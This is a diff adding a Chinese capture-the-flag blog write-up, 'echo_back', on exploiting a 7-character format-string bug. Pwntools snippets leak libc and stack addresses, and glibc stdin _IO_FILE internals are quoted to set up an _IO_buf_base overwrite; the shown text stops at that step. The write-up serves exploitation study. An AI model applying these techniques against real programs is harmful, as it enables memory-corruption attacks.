@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="首先，检查一下程序的保护机制,发现保护全开   然后，我们用IDA分析一下， 在功能2有一个明显的格式化输出字符串漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="echo_back">
+<meta property="og:url" content="https://github.com/ha1vk/2019/11/17/echo_back/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="首先，检查一下程序的保护机制,发现保护全开   然后，我们用IDA分析一下， 在功能2有一个明显的格式化输出字符串漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image2.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image3.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image4.jpeg">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image5.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image6.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image7.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image8.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image9.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image10.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image11.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image12.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image13.JPG">
+<meta property="article:published_time" content="2019-11-17T14:37:50.000Z">
+<meta property="article:modified_time" content="2025-06-21T08:40:24.365Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="格式化字符串漏洞">
+<meta property="article:tag" content="IO FILE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2019/11/17/echo_back/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2019/11/17/echo_back/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>echo_back | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2019/11/17/echo_back/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          echo_back
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-17 22:37:50" itemprop="dateCreated datePublished" datetime="2019-11-17T22:37:50+08:00">2019-11-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-21 16:40:24" itemprop="dateModified" datetime="2025-06-21T16:40:24+08:00">2025-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先，检查一下程序的保护机制,发现<strong>保护全开</strong></p>
+<img src="/ha1vk/2019/11/17/echo_back/image1.JPG" class="">
+
+<p>然后，我们用IDA分析一下，</p>
+<p>在功能2有一个明显的<strong>格式化输出字符串漏洞</strong></p>
+<img src="/ha1vk/2019/11/17/echo_back/image2.JPG" class="">
+
+<p>但是，我们能够输入的字符串长度<strong>最多为7个字符</strong></p>
+<img src="/ha1vk/2019/11/17/echo_back/image3.JPG" class="">
+
+<p>好啦，不管怎么说，首先得用这个漏洞泄露一些地址</p>
+<p>当我们要执行printf时，我们发现，<strong>距离当前栈顶13个位置处，有__libc_start_main+F0的地址</strong>，但是，这不是说要输出它的值就用%13$p，我们得<strong>从13开始，不断加1，测试，最终我们得到了这个数据的位置为%19$p</strong>，于是，我们就可以泄露__libc_start_main+F0的地址了，然后就能计算出libc的加载地址</p>
+<img src="/ha1vk/2019/11/17/echo_back/image4.jpeg" class="">
+
+<p>于是，我们就先泄露它，算出一些需要用到的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echoback(<span class="string">&#x27;%19$p&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line"><span class="comment">#泄露__libc_start_main的地址  </span></span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>) - <span class="number">0xF0</span>  </span><br><span class="line"><span class="comment">#得到libc加载的基地址  </span></span><br><span class="line">libc_base = __libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()  </span><br></pre></td></tr></table></figure>
+
+<p>同理，我们泄露出main的地址，计算出程序的加载地址以及pop rdi的地址，用于给system传参</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#泄露main的地址  </span></span><br><span class="line">echoback(<span class="string">&#x27;%13$p&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line">main_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>) - <span class="number">0x9C</span>  </span><br><span class="line">elf_base = main_addr - main_s_addr  </span><br><span class="line">pop_rdi = elf_base + pop_s_rdi  </span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们直接想到，用格式化字符串漏洞修改main函数的返回地址,也就是修改%19$p处的数据</p>
+<img src="/ha1vk/2019/11/17/echo_back/image5.JPG" class="">
+
+<p>但是，我们知道，%19$n不可行，因为%19$n是把%19$p的数据当成一个地址，然后往那个地址里写数据,也就是说，它会把如图<strong>0x7F8854AD7830</strong>当成一个地址，往这个地址里写数据，而我们希望的是它往如图<strong>0x7FFDCBDF94A8</strong>地址处写数据，那么，我们首先得暴露出它的值，但是，栈里面也没有这个数据啊。然而，却<strong>有main函数的rbp数据</strong></p>
+<img src="/ha1vk/2019/11/17/echo_back/image6.JPG" class="">
+
+<p>我们只需泄露main的rbp的值，然后加8就得到了存放(main函数返回地址)的位置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echoback(<span class="string">&#x27;%12$p&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line"><span class="comment">#泄露main的ebp的值  </span></span><br><span class="line">main_ebp = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)  </span><br><span class="line"><span class="comment">#泄露存放(main返回地址)的地址  </span></span><br><span class="line">main_ret = main_ebp + <span class="number">0x8</span>  </span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们想构造payload，往main_ret处写数据，但是光一个p64(main_ret)包装就占了8个字符，而我们最多允许输入7个字符。这些，我们想到了功能1，setName，它不是白放那里的，它有着重要的作用。</p>
+<img src="/ha1vk/2019/11/17/echo_back/image7.JPG" class="">
+
+<p>它也可以接受7个字符，我们可以把<strong>main_ret存入a1中，虽然只允许7个字符，p64()有8字节，但是末尾一般都是0，由于是低位存储，也就是数据的前导0被舍弃，没有影响，除非那个数据8字节没有前导0</strong></p>
+<p>然后，我们发现，%16$p输出的就是a1的数据。</p>
+<p>于是，我们就可以<strong>先setName(p64(addr))，然后利用%16$n来对addr处写数据</strong></p>
+<p>然而，我们这样来<strong>直接写main_ret处的数据，还是不行，因为我们构造的payload始终长度都会大于7</strong></p>
+<p>于是，我们就需要用到一个新知识了，为了绕过7个字符的限制，我们换一个思路，我们<strong>利用printf漏洞先去攻击scanf内部结构，然后我们就可以直接利用scanf往目标处输入数据</strong>，这就需要去了解scanf的源码了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;    </span><br><span class="line">_IO_FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;    </span><br><span class="line">_IO_FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;   </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">首先，<span class="built_in">scanf</span>最终是从<span class="built_in">stdin</span>中读取数据，而<span class="built_in">stdin</span>是一个FILE (_IO_FILE) 结构体指针。我们再来看看FILE的结构</span><br><span class="line"></span><br><span class="line">```C</span><br><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic </span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments. </span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span>  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>  </span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;   <span class="comment">/* Current read pointer */</span>  </span><br><span class="line">  <span class="type">char</span> *_IO_read_end;   <span class="comment">/* End of get area. */</span>  </span><br><span class="line">  <span class="type">char</span> *_IO_read_base;  <span class="comment">/* Start of putback+get area. */</span>  </span><br><span class="line">  <span class="type">char</span> *_IO_write_base; <span class="comment">/* Start of put area. */</span>  </span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;  <span class="comment">/* Current put pointer. */</span>  </span><br><span class="line">  <span class="type">char</span> *_IO_write_end;  <span class="comment">/* End of put area. */</span>  </span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;   <span class="comment">/* Start of reserve area. */</span>  </span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;    <span class="comment">/* End of reserve area. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span>  </span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span>  </span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span>  </span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> _fileno;  </span><br><span class="line">  <span class="type">int</span> _flags2;  </span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span>  </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;  </span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;  </span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];  </span><br><span class="line">  </span><br><span class="line">  _IO_lock_t *_lock;  </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>
+
+<p>让我们再看看文件的读取过程**_IO_new_file_underflow 这个函数最终调用了_IO_SYSREAD系统调用来读取文件。在这之前，它做了一些处理**</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>  </span><br><span class="line">_IO_new_file_underflow (FILE *fp)  </span><br><span class="line">&#123;  </span><br><span class="line">  <span class="type">ssize_t</span> count;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span>  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)  </span><br><span class="line">    <span class="keyword">return</span> EOF;  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)  </span><br><span class="line">    &#123;  </span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;  </span><br><span class="line">      __set_errno (EBADF);  </span><br><span class="line">      <span class="keyword">return</span> EOF;  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span>  </span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);  </span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;  </span><br><span class="line">    &#125;  </span><br><span class="line">      _IO_doallocbuf (fp);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span>  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t </span></span><br><span class="line"><span class="comment">     required by any standard.  My recollection is that </span></span><br><span class="line"><span class="comment">     traditional Unix systems did this for stdout.  stderr better </span></span><br><span class="line"><span class="comment">     not be line buffered.  So we do just that here </span></span><br><span class="line"><span class="comment">     explicitly.  --drepper */</span>  </span><br><span class="line">      _IO_acquire_lock (_IO_stdout);  </span><br><span class="line">  </span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))  </span><br><span class="line">      == (_IO_LINKED | _IO_LINE_BUF))  </span><br><span class="line">    _IO_OVERFLOW (_IO_stdout, EOF);  </span><br><span class="line">  </span><br><span class="line">      _IO_release_lock (_IO_stdout);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  _IO_switch_to_get_mode (fp);  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those </span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since </span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for </span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span>  </span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;  </span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  </span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end  </span><br><span class="line">    = fp-&gt;_IO_buf_base;  </span><br><span class="line">  </span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  </span><br><span class="line">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);  </span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)  </span><br><span class="line">    fp-&gt;_flags |= _IO_EOF_SEEN;  </span><br><span class="line">      <span class="keyword">else</span>  </span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;  </span><br><span class="line">  &#125;  </span><br><span class="line">  fp-&gt;_IO_read_end += count;  </span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active </span></span><br><span class="line"><span class="comment">     handles.  As a result, our offset cache would no longer be valid, so </span></span><br><span class="line"><span class="comment">     unset it.  */</span>  </span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;  </span><br><span class="line">      <span class="keyword">return</span> EOF;  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)  </span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);  </span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>让我们，看看代码的第58行(标红处)，系统调用，向<strong>fp-&gt;_IO_buf_base</strong>处写入读取的数据，并且长度为<strong>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</strong></p>
+<p>[要是我们能够修改**_IO_buf_base和_IO_buf_end** 那么我们不就可以实现任意位置无限制长度的写数据了吗？]{.mark}</p>
+<p>我们首先需要定位到**<em>IO_2_1_stdin</em><strong>结构体在内存中的位置，然后再定位到</strong>_IO_buf_base** 的位置，_IO_buf_base位于结构体中的第8个，所以，它的_IO_buf_base_addr &#x3D; _IO_buf_base + 0x8 * 7</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stdin_ = libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]  </span><br><span class="line">_IO_2_1_stdin_addr = libc_base + _IO_2_1_stdin_  </span><br><span class="line">_IO_buf_base = _IO_2_1_stdin_addr + <span class="number">0x8</span> * <span class="number">7</span>  </span><br></pre></td></tr></table></figure>
+
+<p>接下来，做什么呢？</p>
+<p>我们先来看看_IO_buf_base的值吧</p>
+<p>先是stdin的位置,当前位于<strong>0x7F9EA22488E0</strong></p>
+<img src="/ha1vk/2019/11/17/echo_back/image8.JPG" class="">
+
+<p>然后是_IO_buf_base，它位于<strong>0x7F9EA22488E0 + 0x8 * 7 &#x3D; 0x7F9EA2248918 ，<strong>它的值为</strong>0x7F9EA2248963 ，</strong> 并且要知道，它的值<strong>相对_IO_2_1_stdin_的地址总是不变的，<strong>假如我们把_IO_buf_base的低一字节覆盖为0，那么他就变成了</strong>0x7F9EA2248900 ，<strong>也就是</strong>0x7F9EA22488E0 + 0x8 * 4处</strong>，跑到了**[结构体内部去了]{.mark}<strong>，也就是结构体中的第5个数据处，也就是_IO_write_base处，并且由于_IO_buf_end没变，那么我们可以从</strong>0x7F9EA2248900处向后**输入0x64-0x00 &#x3D; 0x64个字符，那么我们就能把_IO_buf_base和_IO_buf_end都覆盖成关键地址，那么我们就能绕过7个字符的输入限制</p>
+<p>_IO_buf_base</p>
+<img src="/ha1vk/2019/11/17/echo_back/image9.JPG" class="">
+
+<p>_IO_buf_end</p>
+<img src="/ha1vk/2019/11/17/echo_back/image10.JPG" class="">
+
+<p>那么，我们先来覆盖_IO_buf_base的低1字节为0</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setName(p64(_IO_buf_base))  </span><br><span class="line"><span class="comment">#覆盖_IO_buf_base的低1字节为0  </span></span><br><span class="line">echoback(<span class="string">&#x27;%16$hhn&#x27;</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们就可以<strong>覆盖结构体里的一些数据</strong>了</p>
